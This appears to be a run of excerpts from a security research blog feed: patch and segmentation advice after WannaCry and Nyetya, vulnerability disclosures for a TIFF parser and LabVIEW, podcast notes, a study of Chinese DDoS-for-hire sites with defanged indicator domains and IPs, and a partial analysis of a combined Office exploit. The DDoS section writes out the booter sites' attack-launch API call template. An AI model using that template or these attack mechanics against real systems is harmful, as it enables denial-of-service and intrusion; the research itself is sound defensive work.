MS17-010 vulnerability did not even run properly on most of these systems. Microsoft eventually released updates for MS17-010 for these older operating systems as well. <br /><br />As has been emphasized by the security community for many years, effective patch management is a vital security control that organizations simply must implement within their environments. We have seen many attacks become successful simply because an organization failed to patch their environments. Reliable exploits for 0-day vulnerabilities are often very expensive for attackers, while patched public exploits are very cheap. Attackers simply will not typically utilize a 0-day vulnerability if they can find a cheaper means to achieve their mission objective. As an organization, in most cases if a system within your environment is compromised due to a 0-day vulnerability being exploited, that is a good indicator that you are doing everything else effectively because it means that the attacker likely could not find another cheaper avenue to breach your defenses. <br /><h3>Least Functionality</h3><br />Only implement system functionality that is required for systems to perform their intended role or function. Microsoft recommends disabling SMBv1 if it is not required. Likewise, limiting access to systems and services is another vital security control. Even if SMBv1 is in use on a system, it is rare for it to be required to be exposed to hostile network environments like the internet. Leveraging host-based firewalls, like the one built into the Windows operating system even on internal network segments is another way to control access to these services. <br /><h3>Least Privilege </h3><br />Limit the use of administrative tools like WMI and PSExec to only those systems from which system administrators are performing system management functions. Monitoring for the use of these tools across an organization's network, while not necessarily a preventative security control, can be used to quickly identify compromised systems and enable organizations to initiate appropriate incident response processes.<br /><h3>System and Network Monitoring</h3><br />Computer worms typically propagate very quickly, making them extremely loud in most environments. In both of these cases, the worm would initiate a scanning function to identify new hosts to propagate to. Monitoring the environment for service sweeps, or attempts to connect to many systems by a single system on a network within a short period of time could allow for early identification of compromised systems so that the issue can be addressed before it causes a larger organizational impact.<br /><h3>Network Segmentation</h3><br />Even in environments where it was simply not possible to install the security update associated with MS17-010, network segmentation is a good way to either prevent a successful attack or limit the possible impact of a successful attack to the rest of the organization's environment. Creating ""choke-points"" in communications pathways is a great way to not only limit the impact of a successful compromise, but also provides an ideal location to deploy network-based security controls that can be used to prevent a successful attack from occurring in the first place. As was previously described, the principle of least functionality would dictate that at each of these choke-points, access controls would be deployed to limit communications to only what is actually required for systems to serve their role within the business. Flat networks, while easy to manage and maintain, afford little in the way of mitigating the impact of an attack like WannaCry or Nyetya. <br /><h3>Processes and Policies</h3><br />It is essential that organizations have established policies and processes in place to ensure that they are prepared to respond appropriately and effectively when the unexpected happens. Disaster Recovery and Business Continuity Plans enable organizations to recover from unplanned system outages or disasters. In order for these processes to remain effective over time, organizations must not only have the plans in place, but they must be tested and validated over time to ensure that they continue to meet the needs of the organization. Can your organization recover from a system outage quickly enough to meet its business needs? Is your backup strategy working (i.e. can you recover using your backups alone?) These needs change over time and testing these processes will help ensure they remain effective before an outage or disaster occurs. Incident Response is another example of a process that should be in place and tested periodically through the use of hunting exercises, tabletop exercises, and walkthroughs. This is the only way to truly ensure that the incident response team has the knowledge and tools necessary to effectively respond when security events occur within an environment.<br /><br /><h2>Conclusion</h2><br />WannaCry and Nyetya are two examples of events that resulted in many organizations around the world being significantly impacted by malware. These events underscore the need to get back to the basics from an information security perspective to ensure that organizations are adequately protected and ready to respond to disruptive events that may occur within their environments. Computer worms are nothing new, they have been around for decades. Having a sound, layered, defense-in-depth strategy in place will ensure that organizations can prevent widespread system outages, and detect and respond when system compromise occurs within their environments to minimize the impact these events may have. <br /><br />The National Institute of Standards and Technology (NIST) has released Special Publication 800-53 ""Security and Privacy Controls for Federal Information Systems and Organizations"" which provides comprehensive guidance regarding recommended best practices and the selection of security controls that can be implemented to establish a sound defensive architecture within networked environments. This guidance is available <a href=""http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r4.pdf"">here</a>. <br /><br /><div class=""feedflare"">

This toolkit used in multiple desktop applications including Chromium, Firefox, GNOME thumbnailer, VLC and others.

A specially crafted TIFF file can cause a heap-overflow resulting in remote code execution. The vulnerability exists in the TIFF parser and only happens if the library is compiled with the high optimization flag `-O3` (tested with clang). The toolkit comes with a few defined `if statements` inside the `tiff_image_parse` function. Their intention is to check for integer overflows. Unfortunately, with compiler optimization, the compiler removes these checks. The problem is that the compiler recognizes them as ""Undefined Behavior"" and removes them for optimization.

2017-09-03 23:27:53+08:00,Vulnerability Spotlight: Code Execution Vulnerability in LabVIEW,Talos Blog,"<div>Vulnerability discovered by Cory Duplantis of Cisco Talos.</div><br /><b>Update</b>: 9/1/17 - National Instruments has published the following <a href=""http://www.ni.com/product-documentation/54099/en"">advisory</a><br /><br /><h2>Overview</h2><br /><div>LabVIEW is a system design and development platform released by National Instruments. The software is widely used to create applications for data acquisition, instrument control and industrial automation. Talos is disclosing the presence of a potential code execution vulnerability which can be triggered by opening specially crafted VI files, the proprietary file format used by LabVIEW.</div><br /><a name=""more""></a><h3>TALOS-2017-0273 code execution vulnerability (CVE-2017-2779)</h3><br /><div>The VI file format describes various systems implemented in LabVIEW. Although there is no published specification for the file format, inspecting the files shows that they contain a section named ‘RSRC’, presumably containing resource information. Modulating the values within this section of a VI file can cause a controlled looping condition resulting in an arbitrary null write. This vulnerability can be used by an attacker to create a specially crafted VI file that when opened results in the potential execution of code supplied by the attacker.</div><br /><div>Full details of the vulnerability are available <a href=""http://www.talosintelligence.com/reports/TALOS-2017-0273/"">here</a>.</div><br /><div>National Instruments does not consider that this issue constitutes a vulnerability in their product, since any .exe like file format can be modified to replace legitimate content with malicious and has declined to release a patch. Talos disagrees. There are similarities between this vulnerability and the .NET PE loader vulnerability <a href=""https://nvd.nist.gov/vuln/detail/CVE-2007-0041"">CVE-2007-0041</a> which was patched in <a href=""https://technet.microsoft.com/en-us/library/security/ms07-040.aspx"">MS07-040</a>. Additionally, many users may be unaware that VI files are analogous to .exe files and should be accorded the same security requirements.</div><br /><div>Known vulnerable versions:</div><div>LabVIEW 2016 version 16.0</div><br /><h2>Discussion</h2><br /><div>We have previously disclosed a <a href=""http://blog.talosintelligence.com/2017/03/vulnerability-spotlight-code-execution.html"">vulnerability</a> in the same software. As with the previous disclosure, organisations should be aware that proprietary file formats without a published specification are nevertheless amenable to inspection to identify vulnerabilities. The consequences of a successful compromise of a system that interacts with the physical world, such as a data acquisition and control systems, may be critical to safety. Organisations that deploy such systems, even as pilot projects, should be aware of the risk posed by vulnerabilities such as these and adequately protect systems.</div><br /><h2>Coverage</h2><br /><div>The following Snort Rules will detect exploitation attempts. Note that additional rules may be released at a future date and current rules are subject to change pending additional vulnerability information. For the most current rule information, please refer to your FireSIGHT Management Center or Snort.org.</div><br /><div>Snort Rules: 41368- 41369</div><div class=""feedflare"">

On top of being distributed all around the planet this week, we had some technical issues with our recording platform that created a nice audio jigsaw puzzle to solve. Matt’s audio remained a challenge; it is rough this week.  Bear with us, the audio quality will be back to what you have come to expect next episode.  If you would like to speak to the manager, please hold. <br /><br />The last several years have seen a continuing surge in booters, DDOS, and combined exploit campaigns for-hire coming out of Asia and other regions. What does this tell us about the continued “professionalization” of the cyber criminal enterprise? What happens now that the playing field is leveled and launching these attacks requires nothing more than a few hundred USD in cryptocurrency?<br /><a name=""more""></a><br />We also discuss “hacking back” - some say it should be legal. Most people who know what they are talking about seem to think otherwise. Despite several strained analogies involving arms dealers, various calibers of ammo, and other nonsense, the crew makes a point about what it actually solves (hint: not much, especially considering the low chances of 100% certainty for most observers)<br /><h3>EP11 Timetable:</h3>00:47 - Roundtable <br />16:13 - Booters, DDOS, and Combo Exploits, oh my!<br />30:45 - Hacking back - the ACDC Act (copyright 2017 Talos) and other terrible ideas<br />58:15 - Parting shots - How to win Powerball with this one weird timezone trick!  <br /><br />==========<br />Featuring: <a href=""https://twitter.com/security_craig"">Craig Williams</a> (@Security_Craig), <a href=""https://twitter.com/JoelEsler"">Joel Esler</a> (@JoelEsler), <a href=""https://twitter.com/kpyke"">Matt Olney</a> (@kpyke) and <a href=""https://twitter.com/EnglishLFC"">Nigel Houghton</a> (@EnglishLFC). <br />Hosted by <a href=""https://twitter.com/MitchNeff"">Mitch Neff</a> (@MitchNeff)<br /><br />Find all episodes:<br /><a href=""http://cs.co/talospodcast"">http://cs.co/talospodcast</a> <br /><br />Subscribe via iTunes (and leave a review!)<br /><a href=""http://cs.co/talositunes"">http://cs.co/talositunes</a> <br /><br />Check out the Talos Threat Research Blog:<br /><a href=""http://cs.co/talosresearch"">http://cs.co/talosresearch</a> <br /><br />Subscribe to the Threat Source newsletter:<br /><a href=""http://cs.co/TalosUpdate"">http://cs.co/talosupdate</a> <br /><br />Follow Talos on Twitter:<br /><a href=""http://cs.co/talostwitter"">http://cs.co/talostwitter</a> <br /><br />Give us your feedback and suggestions for topics:<br /><a href=""mailto:beerswithtalos@cisco.com"" target=""_blank"">beerswithtalos@cisco.com </a><br /><br /><div class=""feedflare"">

2017-08-16 01:14:41+08:00,Booters with Chinese Characteristics: The Rise of Chinese Online DDoS Platforms,Talos Blog,"<i>This post was authored by Dave Liebenberg</i><br /><br /><br />In the past few months, Talos has observed an uptick in the number of Chinese websites offering online DDoS services. Many of these websites have a nearly identical layout and design, offering a simple interface in which the user selects a target’s host, port, attack method, and duration of attack. In addition, the majority of these sites have been registered within the past six months. However, the websites operate under different group names and have different registrants. In addition, Talos has observed administrators of these websites launching attacks on one another. Talos sought to research the actors responsible for creating these platforms and analyze why they have become more prevalent lately.<br /><br /><br />In this blog post, we will begin by looking at the DDoS industry in China and charting the shift toward online DDoS platforms. Then we will examine the types of DDoS platforms created recently, noting their similarities and differences. Finally, we will look into the source code likely responsible for the recent increase in these nearly identical DDoS websites.<br /><br /><a name=""more""></a><br /><div><div><h3>DDoS-as-a-Service in China</h3></div><div><br /></div><div>DDoS tools and services remain some of the most popular offerings in the Chinese underground market. A look at one of the most popular Chinese marketplaces, DuTe (独特), reveals a variety of DDoS-related tools, including actual attack tools as well as associated tools such as brute forcers for different vectors including SSH and RDP.&nbsp;</div><div><br /></div><div>In addition, Chinese social media applications such as WeChat and QQ have hundreds of group chats devoted to DDoS groups, tools, malware, and the exchange of targets. The people interacting in these channels include members of hacking groups, customers, as well as agents and advertisers who can act as intermediaries.&nbsp;</div><div><br /></div><div>Previously, the predominant offering in these group chats were tools that users could purchase, download, and then operate from their own machine. A good example of this type of tool was the TianFa Pressure Testing System.<br /><br /><table align=""center"" cellpadding=""0"" cellspacing=""0"" class=""tr-caption-container"" style=""margin-left: auto; margin-right: auto; text-align: center;""><tbody><tr><td style=""text-align: center;""><a href=""https://3.bp.blogspot.com/-6InGniD-Rks/WZMimqYkZTI/AAAAAAAAASA/bBlaDUQwPJYUsBSQ70bPpojMR1I1Xp90ACEwYBhgL/s1600/1.png"" style=""margin-left: auto; margin-right: auto;""><img border=""0"" height=""452"" src=""https://3.bp.blogspot.com/-6InGniD-Rks/WZMimqYkZTI/AAAAAAAAASA/bBlaDUQwPJYUsBSQ70bPpojMR1I1Xp90ACEwYBhgL/s640/1.png"" width=""640"" /></a></td></tr><tr><td class=""tr-caption"" style=""text-align: center;"">TianFa DDoS tool</td></tr></tbody></table><br /><br />These kinds of tools manage and provide information about a user’s botnet, and then allow the user to customize an attack event, selecting a target and choosing an attack method. Users can purchase the tool, download a copy, and use it with their own servers and botnets. Occasionally, hacker groups also bundle servers or a certain amount of bots with purchases, or include brute-forcing tools to help users grow their own botnet, but the end-user would be in charge of maintaining and deploying the tool.<br /><br /><h3>The Rise of Online DDoS Platforms</h3><br /><br />Recently, Talos has noticed a gradual paradigm shift underway in the group chats. Advertisements for online DDoS platforms have begun to appear more frequently.<br /><br /><table align=""center"" cellpadding=""0"" cellspacing=""0"" class=""tr-caption-container"" style=""margin-left: auto; margin-right: auto; text-align: center;""><tbody><tr><td style=""text-align: center;""><a href=""https://2.bp.blogspot.com/-T9zpSpavu6M/WZMiqz0fASI/AAAAAAAAAS0/8OszBOWrD5Q1klU0UeFQheL9jfnkYxzkgCEwYBhgL/s1600/2.png"" style=""margin-left: auto; margin-right: auto;""><img border=""0"" height=""191"" src=""https://2.bp.blogspot.com/-T9zpSpavu6M/WZMiqz0fASI/AAAAAAAAAS0/8OszBOWrD5Q1klU0UeFQheL9jfnkYxzkgCEwYBhgL/s400/2.png"" width=""400"" /></a></td></tr><tr><td class=""tr-caption"" style=""text-align: center;"">Advertiser promotes “ShaShen” Online DDoS Website</td></tr></tbody></table><br /><br />After inspecting several of these websites, Talos noticed that many had identical login and registration pages, down to the same background image:<br /><br /><div class=""separator"" style=""clear: both; text-align: center;""><a href=""https://2.bp.blogspot.com/-QIWWv5N77PA/WZMiq7IgzgI/AAAAAAAAAS0/lnEt44_R3kMDdzbla97D4ZDZjYYh7BwsACEwYBhgL/s1600/3.png"" style=""margin-left: 1em; margin-right: 1em;""><img border=""0"" height=""348"" src=""https://2.bp.blogspot.com/-QIWWv5N77PA/WZMiq7IgzgI/AAAAAAAAAS0/lnEt44_R3kMDdzbla97D4ZDZjYYh7BwsACEwYBhgL/s640/3.png"" width=""640"" /></a></div><div class=""separator"" style=""clear: both; text-align: center;""><br /></div><div class=""separator"" style=""clear: both; text-align: center;""><a href=""https://1.bp.blogspot.com/-GmGwbO5tQaI/WZMirP3DuJI/AAAAAAAAAS0/ocneBFcH5YwIa_FxM-9-JMgoYydmGSu4wCEwYBhgL/s1600/4.png"" style=""margin-left: 1em; margin-right: 1em;""><img border=""0"" height=""336"" src=""https://1.bp.blogspot.com/-GmGwbO5tQaI/WZMirP3DuJI/AAAAAAAAAS0/ocneBFcH5YwIa_FxM-9-JMgoYydmGSu4wCEwYBhgL/s640/4.png"" width=""640"" /></a></div><div class=""separator"" style=""clear: both; text-align: center;""><br /></div><div class=""separator"" style=""clear: both; text-align: center;""><br /></div><br /><br />In addition, Talos observed that many of these websites have a nearly identical website design and layout, displaying the number of active users and servers online as well as the total number of attacks that have been carried out (although these numbers vary between groups). In addition, the sites contain announcements from group administrators on recent updates to the tool, its capabilities, or restrictions on its use. In the sidebar, users can register an account, purchase an activation code to begin launching an attack, and then attack a target, either through the graphical interface set up on the website or through identical command line calls with look like this:<br /><br />http://<b>website_name</b>/api.php?<b>username</b>=&amp;<b>password</b>=&amp;<b>host</b>=&amp;<b>port</b>=&amp;<b>time</b>=&amp;<b>method</b>=<br /><br /><div class=""separator"" style=""clear: both; text-align: center;""><a href=""https://3.bp.blogspot.com/-0dZ_D-3slOA/WZMirAho3qI/AAAAAAAAAS0/0lfsQ0EQhaMxHL7Z_7yrhvqWwpSoVVGKwCEwYBhgL/s1600/5.png"" style=""margin-left: 1em; margin-right: 1em;""><img border=""0"" height=""426"" src=""https://3.bp.blogspot.com/-0dZ_D-3slOA/WZMirAho3qI/AAAAAAAAAS0/0lfsQ0EQhaMxHL7Z_7yrhvqWwpSoVVGKwCEwYBhgL/s640/5.png"" width=""640"" /></a></div><br /><table align=""center"" cellpadding=""0"" cellspacing=""0"" class=""tr-caption-container"" style=""margin-left: auto; margin-right: auto; text-align: center;""><tbody><tr><td style=""text-align: center;""><a href=""https://4.bp.blogspot.com/-fZJTxozOkWs/WZMirElwgDI/AAAAAAAAAS0/KMOFyV9nFYsux28I2NAYeU3pMI_eUZr6gCEwYBhgL/s1600/6.png"" style=""margin-left: auto; margin-right: auto;""><img border=""0"" height=""296"" src=""https://4.bp.blogspot.com/-fZJTxozOkWs/WZMirElwgDI/AAAAAAAAAS0/KMOFyV9nFYsux28I2NAYeU3pMI_eUZr6gCEwYBhgL/s640/6.png"" width=""640"" /></a></td></tr><tr><td class=""tr-caption"" style=""text-align: center;"">Nearly identical website layout for ShaShen DDoS group and Wang Zhe sec DDoS group.</td></tr></tbody></table><br /><br /><br />Besides the uncanny similarities in design and function, the majority of the websites had the word “ddos” in their domain names, i.e. “shashenddos.club” or “87ddos.cc.” Since these sites were all recently registered, beside relying on intelligence from Chinese social media, Talos was able to identify several new websites by using Cisco Umbrella’s investigate tool to conduct a regex search for recently-registered domains with the word “ddos” in them. Using these combined search methods, Talos was able to identify 32 nearly-identical Chinese online DDoS websites (presumably there are more out there, since not all of these websites had “ddos” in the their domain name).<br /><br />Because of the similarities in the pages, and the fact that some individuals registered multiple sites for the same group, we initially suspected that one actor was potentially responsible for all the sites and was merely operating under different aliases. In order to test our theory we registered an account with each site and also used Cisco Umbrella’s investigate tool to examine each site’s registration info.<br /><br />We soon revised our one-actor theory. After registering accounts at various sites we noticed that many employed different third-party Chinese payment websites where users could purchase activation codes (typical prices range from around 20RMB for a day-use code to around 400RMB for a month-use pass). In addition, the announcements on the pages displayed different tool capabilities (some advertised attack power of 30-80gbps, while others went as high as 300gbps), as well as different contact information, including various QQ accounts for customer service as well as group chat numbers for customers and administrators to interact. There were also vast differences in the numbers of attacks and users, with one page (www[.]dk[.]ps88[.]org) listing 168,423 attacks made by 44,238 users and another (www[.]pc4[.]tw) listing 24 attacks made by 13 users.<br /><br />In addition, the websites’ registration information also revealed key differences. Most of the websites had different registrant names and emails, as well as different registrar’s listed. However, there were some similarities as well: almost all had used Chinese registrars, the majority were registered in the past 3 months, and nearly all were registered in the past year. In addition, over half were hosted on Cloudflare IPs.<br /><br />Our final confirmation that different actors were behind these websites came when Talos was monitoring a QQ group chat channel affiliated with one of these online DDoS platforms called Wang Zhe sec. We observed a group member requesting an attack on a rival online DDoS group, 87 DDoS, with which we had also already registered an account.<br /><br /><table align=""center"" cellpadding=""0"" cellspacing=""0"" class=""tr-caption-container"" style=""margin-left: auto; margin-right: auto; text-align: center;""><tbody><tr><td style=""text-align: center;""><a href=""https://3.bp.blogspot.com/-QEIHpNA6XSw/WZMirEZWaxI/AAAAAAAAAS0/M3AaUL9iaZsMHbZnR0mdapfrArNL6_l8wCEwYBhgL/s1600/7.png"" style=""margin-left: auto; margin-right: auto;""><img border=""0"" height=""315"" src=""https://3.bp.blogspot.com/-QEIHpNA6XSw/WZMirEZWaxI/AAAAAAAAAS0/M3AaUL9iaZsMHbZnR0mdapfrArNL6_l8wCEwYBhgL/s400/7.png"" width=""400"" /></a></td></tr><tr><td class=""tr-caption"" style=""text-align: center;"">A member of Wang Zhe sec chat group requests attack on rival online DDoS website</td></tr></tbody></table><br /><br />Talos joined a number of group chats associated with online DDoS platforms and observed multiple actors discussing launching DDoS attacks on rival groups.

We began to gain insight into the story behind these questions after an actor in a group chat run by a Chinese hacker group posted a screenshot of the admin page for his online DDoS platform:<br /><br /><table align=""center"" cellpadding=""0"" cellspacing=""0"" class=""tr-caption-container"" style=""margin-left: auto; margin-right: auto; text-align: center;""><tbody><tr><td style=""text-align: center;""><a href=""https://3.bp.blogspot.com/-Aqu7eM9BmnA/WZMirT-HpsI/AAAAAAAAAS0/RjqbC_Q8_WQLNx2e7SvGf0w_oF2FvKEvACEwYBhgL/s1600/9.png"" style=""margin-left: auto; margin-right: auto;""><img border=""0"" height=""600"" src=""https://3.bp.blogspot.com/-Aqu7eM9BmnA/WZMirT-HpsI/AAAAAAAAAS0/RjqbC_Q8_WQLNx2e7SvGf0w_oF2FvKEvACEwYBhgL/s640/9.png"" width=""640"" /></a></td></tr><tr><td class=""tr-caption"" style=""text-align: center;"">An actor posts a screenshot of their admin panel for their online DDoS platform</td></tr></tbody></table><br /><br />The screenshot showed a setup page where the actor could choose a name for the site, write a description, and provide links to the terms of service and URLs. Several items of interest jumped out at us, providing further avenues for research. First we noticed the word “Gemini” in the top right corner. Second, we noticed the unique URL of “/yolo/admin/settings.” Finally, we noticed a button at the bottom of the screen where an administrator could select “Cloudflare mode”, which reminded us how many of the websites had been hosted on Cloudflare IPs<br /><br /><h3>Finding and Analyzing the Source Code</h3><br /><br />We now had a hunch that the rise of these nearly identical websites was due to some sort of shared source code, which was likely being offered on Chinese underground hacking forums and marketplaces. We went to several of the forums and searched for the “/yolo/admin/settings” URL present in the screenshot. We discovered that several forums had posts offering the sale of source code for an online DDoS platform, all identifying it as a foreign DDoS platform that had been translated into Chinese.<br /><br />Many of the postings were made in early 2017 or late 2016, corresponding to the timeline of the rise in the DDoS platforms. And the pictures in the advertisements looked identical to websites we had been seeing:<br /><br /><table align=""center"" cellpadding=""0"" cellspacing=""0"" class=""tr-caption-container"" style=""margin-left: auto; margin-right: auto; text-align: center;""><tbody><tr><td style=""text-align: center;""><a href=""https://1.bp.blogspot.com/-FdHXdVvCK8M/WZMiqZsMcHI/AAAAAAAAAS0/HV5gDtGjU-cCOJY1LV0goxrxQT8lYa8EACEwYBhgL/s1600/10.png"" style=""margin-left: auto; margin-right: auto;""><img border=""0"" height=""626"" src=""https://1.bp.blogspot.com/-FdHXdVvCK8M/WZMiqZsMcHI/AAAAAAAAAS0/HV5gDtGjU-cCOJY1LV0goxrxQT8lYa8EACEwYBhgL/s640/10.png"" width=""640"" /></a></td></tr><tr><td class=""tr-caption"" style=""text-align: center;"">Example of an advertisement for the DDoS platform source code.

It was clear that the source code corresponded to the DDoS websites we observed. The PHP files contained icons that matched those found on the websites. In addition, the background that the majority of these sites employ was also found in the images folder:<br /><br /><div class=""separator"" style=""clear: both; text-align: center;""><a href=""https://2.bp.blogspot.com/-bN52FOrOF5M/WZMiqfkctRI/AAAAAAAAAS0/Hv3JrHwIGrciGy6EoV0ehUNHYFD2yi7gwCEwYBhgL/s1600/11.png"" style=""margin-left: 1em; margin-right: 1em;""><img border=""0"" height=""404"" src=""https://2.bp.blogspot.com/-bN52FOrOF5M/WZMiqfkctRI/AAAAAAAAAS0/Hv3JrHwIGrciGy6EoV0ehUNHYFD2yi7gwCEwYBhgL/s640/11.png"" width=""640"" /></a></div><br /><br />The source code revealed that the platform relied on Bootstrap front-end design and ajax to load content. In the CSS files we found an author named as Pixelcave. Researching Pixelcave, we discovered that they offered Bootstrap-based website designs that looked similar to the online Chinese DDoS websites we had examined. We also noticed that Pixelcave’s logo was present in the top right hand corner of many of the DDoS websites we had found and was also included as an icon in the source code.<br /><br /><table align=""center"" cellpadding=""0"" cellspacing=""0"" class=""tr-caption-container"" style=""margin-left: auto; margin-right: auto; text-align: center;""><tbody><tr><td style=""text-align: center;""><a href=""https://3.bp.blogspot.com/-1IfbFV6pUMs/WZMiqXSHSQI/AAAAAAAAAS0/Of4hFIPboSUFmrICrquVoFQCeU9sQlrnQCEwYBhgL/s1600/12.png"" style=""margin-left: auto; margin-right: auto;""><img border=""0"" src=""https://3.bp.blogspot.com/-1IfbFV6pUMs/WZMiqXSHSQI/AAAAAAAAAS0/Of4hFIPboSUFmrICrquVoFQCeU9sQlrnQCEwYBhgL/s1600/12.png"" /></a></td></tr><tr><td class=""tr-caption"" style=""text-align: center;"">Logo for Pixelcave, which was present on all the DDoS websites we identified.</td></tr></tbody></table><br /><br />According to the source code, the platform has functions which pull information from mysql databases and assess a user’s standing (i.e. the amount of attacks, duration of attacks, and number of concurrent attacks a user is allowed based on payments they have made). It then allows a user to input a host, select an attack method, (i.e. NTP, L7) and duration. Provided that the method is supported by the actors and the target is not blacklisted, it calls servers to begin carrying out the attacks.<br /><br />Interestingly, the source code provides a blacklist for sites that cannot be attacked, and includes “.gov” and “.edu” sites among them, although these can obviously be modified. In addition, it comes with a preloaded Terms of Service (in Mandarin) which absolves the administrators of the site from any responsibility for “illegal” acts and asserts that its services are only meant for testing purposes.<br /><br />The code also allows administrators to monitor payments made, outstanding tickets, as well as an overview of the total amount of logins and attacks being contracted, and details about the attacks such as the host, duration of the attack, and which server is conducting the attack. The administrator can also set up an activation code system.<br /><br />It is clear that the source code was originally written in English, but was modified so that the final platform would display Chinese language graphics (as advertised). The source code also provides options for administrators to set up payment systems through Paypal and Bitcoin. It is likely that Chinese actors would modify this by switching it to a Chinese payment system, like third-party payment sites or Chinese services like Alipay. In fact the icon for Paypal in one image folder is altered to resemble the Alipay icon.<br /><br />It is unclear as of the time of this writing where the original source code derived from. However, there are several English language websites that offer online DDoS services, such as the tool DataBooter. These websites have some similarities to the Chinese DDoS platforms. For instance, they have a bootstrap-based design, are hosted on Cloudflare, and have similar graphics conveying the number of attacks, users, and servers online.<br /><br /><table align=""center"" cellpadding=""0"" cellspacing=""0"" class=""tr-caption-container"" style=""margin-left: auto; margin-right: auto; text-align: center;""><tbody><tr><td style=""text-align: center;""><a href=""https://3.bp.blogspot.com/-k34M8x_RaqI/WZMiq1lJQ0I/AAAAAAAAAS0/UsG18JrZb8o9pFb85iHJD0EfddKtJPWSwCEwYBhgL/s1600/13.png"" style=""margin-left: auto; margin-right: auto;""><img border=""0"" height=""254"" src=""https://3.bp.blogspot.com/-k34M8x_RaqI/WZMiq1lJQ0I/AAAAAAAAAS0/UsG18JrZb8o9pFb85iHJD0EfddKtJPWSwCEwYBhgL/s640/13.png"" width=""640"" /></a></td></tr><tr><td class=""tr-caption"" style=""text-align: center;"">Layout for databooter[.]com. The layout is somewhat similar to the Chinese online DDoS websites.</td></tr></tbody></table><br /><br />Talos has observed actors selling source code for these types of English-language DDoS platforms on hacker forums in the past few years. It is possible that Chinese actors obtained this source code, or code based on it, and modified it to localize it more to Chinese consumers, though we have not found direct evidence of this.<br /><br /><h3>Conclusion</h3><br /><br />The recent uptick in Chinese online DDoS platforms seems to be connected to source code for sale on Chinese hacker forums. This source code appears to be a localized version of code originally written for English language online booters.<br /><br />Online DDoS platforms remain popular because of their easy-to-use interfaces and the fact that they already provide all necessary infrastructure to the user, so there is no need to build a botnet or purchase additional services. Instead, the user purchases an activation code through a trusted payment site and then simply enters in their target. This serves the function of enabling even the most novice of actors the capability to launch powerful attacks, depending on the strength of the DDoS group’s backend infrastructure.<br /><br />Talos will continue to monitor Chinese hacker forums and group chats for newly-created online Chinese DDoS platforms as well as greater trends emerging in the Chinese DDoS industry.<br /><br /><h3>IOCs:</h3><br /><b>Online DDoS Websites</b><br /><b><br /></b>www[.]794ddos[.]cn<br />www[.]dk.ps88[.]org<br />www[.]tmddos[.]top<br />www[.]wm-ddos[.]win<br />www[.]tc4[.]pw<br />www[.]hkddos[.]cn<br />www[.]ppddos[.]club<br />www[.]lnddos[.]cn<br />www[.]711ddos[.]cn<br />www[.]830ddos[.]top<br />www[.]bbddos[.]com<br />www[.]941ddos[.]club<br />www[.]123ddos[.]net<br />www[.]the-dos[.]com<br />www[.]etddos[.]cn<br />www[.]jtddos[.]me<br />www[.]ccddos[.]ml<br />www[.]87ddos[.]cc<br />www[.]ddos[.]cx<br />www[.]hackdd[.]cn<br />www[.]shashenddos[.]club<br />www[.]minddos[.]club<br />www[.]caihongtangddos[.]cn<br />www[.]zfxcb[.]top<br />www[.]91moyu[.]top<br />www[.]xcbzy[.]club<br />www[.]this-ddos[.]cn<br />www[.]aaajb[.]top<br />www[.]ddos[.]qv5[.]pw<br />www[.]tdddos[.]com<br />www[.]ddos[.]blue<br /><br /><b>IPs</b><br /><br />104[.]18.54.93<br />104[.]18.40.150<br />115[.]159.30.202<br />104[.]27.161.160<br />104[.]27.174.49<br />104[.]27.128.111<br />144[.]217.162.94<br />104[.]27.130.205<br />103[.]255.237.138<br />45[.]76.202.77<br />104[.]27.177.67<br />104[.]31.86.177<br />103[.]42.212.68<br />142[.]4.210.15<br />104[.]18.33.110<br />104[.]27.154.16<br />104[.]27.137.58<br />23[.]230.235.62<br />104[.]18.42.18<br />162[.]251.93.27<br />104[.]18.62.202<br />104[.]24.117.44<br />104[.]28.4.180<br />104[.]31.76.30</div></div><div class=""feedflare"">

2017-08-15 00:55:34+08:00,When combining exploits for added effect goes wrong,Talos Blog,"<h3 id=""h.o562lfhybzl7"">Introduction</h3><br />Since public disclosure in April 2017, <a href=""https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0199"">CVE-2017-0199</a> has been frequently used within malicious Office documents. The vulnerability allows attackers to include Ole2Link objects within RTF documents to launch remote code when HTA applications are opened and parsed by Microsoft Word.<br /><br />In this recent campaign, attackers combined CVE-2017-0199 exploitation with an earlier exploit, <a href=""https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0158"">CVE-2012-0158</a>, possibly in an attempt to evade user prompts by Word, or to arrive at code execution via a different mechanism. Potentially, this was just a test run in order to test a new concept. In any case, the attackers made mistakes which caused the attack to be a lot less effective than it could have been.<br /><br />Analysis of the payload highlights the potential for the Ole2Link exploit to launch other document types, and also demonstrates a lack of rigorous testing procedures by at least one threat actor.<br /><br /> Attackers are obviously trying to find a way around known warning mechanisms alerting users about potential security issues with opened documents. In this blog post we analyse what happens when an attack attempts to combine these two exploits in a single infection chain and fails.<br /> <br /> Although this attack was unsuccessful it has shown a level of experimentation by attackers seeking to use CVE-2017-0199 as a means to launch additional weaponized file types and avoid user prompts. It may have been an experiment that didn’t quite work out, or it may be indication of future attacks yet to materialise.<br />  <a name=""more""></a><br /><br /><h3 id=""h.8er5iyy5kysj"">Standard CVE-2017-0199 exploitation</h3><div><br /></div>A typical attack exploiting CVE-2017-0199 consists of an email campaign, distributing a malicious RTF document.The vulnerability exists in code that handles Ole2Link embedded objects.

This file satisfies both of the conditions searched for by the first stage shellcode. Since the CVE-2017-0199 exploiting file is open before the CVE-2012-0158 document, its handle is smaller and it is read first by the shellcode. <br /><br /><div class=""separator"" style=""clear: both; text-align: center;""><a href=""https://2.bp.blogspot.com/-g8G1hw8kKnE/WZGNXJFLWDI/AAAAAAAAAFQ/1x9IYMV2TaokHwZXIigam-pqlP8CFPSHwCLcBGAs/s1600/image1.png"" style=""margin-left: 1em; margin-right: 1em;""><img border=""0"" height=""278"" src=""https://2.bp.blogspot.com/-g8G1hw8kKnE/WZGNXJFLWDI/AAAAAAAAAFQ/1x9IYMV2TaokHwZXIigam-pqlP8CFPSHwCLcBGAs/s640/image1.png"" width=""640"" /></a></div><div class=""separator"" style=""clear: both; text-align: center;"">First stage shellcode looking for the next shellcode stage marker</div><div style=""text-align: center;""><br /></div>The shellcode searches for the next stage marker 0xfefefefefeffffffff within the wrong document,  without correctly handling reads beyond the document length.

